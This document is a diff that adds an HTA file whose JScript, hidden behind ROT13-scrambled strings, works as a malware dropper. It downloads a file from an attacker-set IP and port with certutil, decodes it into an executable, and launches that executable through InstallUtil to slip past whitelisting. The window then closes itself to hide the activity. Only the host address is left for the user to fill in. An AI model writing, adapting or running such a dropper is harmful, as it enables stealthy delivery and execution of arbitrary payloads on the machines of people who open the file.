@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>HTA</title>
+    <meta http-equiv="x-ua-compatible" content="IE=edge" />
+
+    <script language="JScript">
+        var alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".split("");
+        var ranalph = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm".split("");
+        var num = "0123456789".split("");
+        var sym = "/$:;-\\%#*&!. ".split("");
+
+        function scram(s) {
+            return s.replace(/[a-zA-Z]/g, function (c) {
+                var base = c <= "Z" ? 65 : 97;
+                return String.fromCharCode(
+                    (c.charCodeAt(0) - base + 13) % 26 + base
+                );
+            });
+        }
+
+        var sample;
+        var str1, str2, str3, str4, str5;
+        var wobj;
+        var cmd, cmd2, cmd3, cmd4;
+        var ex;
+
+        sample = " preghgvy.rkr -heypnpur -fcyvg -s ";
+        str1 = scram(sample);
+
+        sample = "JFpevcg.Furyy";
+        wobj = scram(sample);
+
+        // Update IP and Port here
+        sample = "<ip>:<port>/svyr.gkg P:\\Jvaqbjf\\Gnfxf\\svyr.gkg";
+        str2 = scram(sample);
+
+        sample = "uggc://";
+        str3 = scram(sample);
+
+        sample = "preghgvy -qrpbqr P:\\Jvaqbjf\\Gnfxf\\svyr.gkg P:\\Jvaqbjf\\Gnfxf\\oc.rkr";
+        str4 = scram(sample);
+
+        sample = "P:\\Jvaqbjf\\Zvpebfbsg.ARG\\Senzrjbex64\\i4.0.30319\\VafgnyyHgvy.rkr /ybtsvyr= /YbtGbPbafbyr=snyfr /H P:\\Jvaqbjf\\Gnfxf\\oc.rkr";
+        str5 = scram(sample);
+
+        ex = new ActiveXObject(wobj);
+
+        cmd =
+            "%comspec% /v /c \"set t=" +
+            str3 +
+            "&&" +
+            str1 +
+            "!t!" +
+            str2 +
+            "\"";
+
+        cmd2 = str4;
+        cmd3 = str5;
+        cmd4 = scram("cvat 127.0.0.1 -a 10");
+
+        ex.Run(cmd);
+        ex.Run(cmd4, 0, true);
+        ex.Run(cmd2);
+        ex.Run(cmd3);
+    </script>
+</head>
+
+<body>
+    <script language="JScript">
+        self.close();
+    </script>
+</body>
+</html>
